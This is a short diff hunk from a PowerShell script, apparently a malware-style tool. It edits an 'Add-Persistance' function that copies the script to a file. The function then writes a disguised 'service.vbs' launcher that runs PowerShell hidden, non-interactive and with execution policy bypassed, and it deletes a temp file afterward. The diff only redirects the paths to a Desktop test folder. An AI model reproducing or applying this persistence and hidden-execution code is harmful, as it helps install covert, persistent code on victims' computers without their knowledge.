@@ -395,7 +395,7 @@ Write-Output "Done."
 
 Function Add-Persistance{
 #$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
-$newScriptPath = "$env:USERPROFILE\Desktop\copy.ps1"
+$newScriptPath = "$env:USERPROFILE\Desktop\test\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
 if ($newScriptPath.Length -lt 100){
@@ -406,9 +406,9 @@ if ($newScriptPath.Length -lt 100){
     }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""C:\Users\$env:USERPROFILE\Desktop\copy.ps1""", 0, True
+objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""$env:USERPROFILE\Desktop\test\copy.ps1""", 0, True
 '@
-$pth = "$env:USERPROFILE\Desktop\service.vbs"
+$pth = "$env:USERPROFILE\Desktop\test\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
 Write-Output "Persistance Added."
 rm -path "$env:TEMP\temp.ps1" -Force
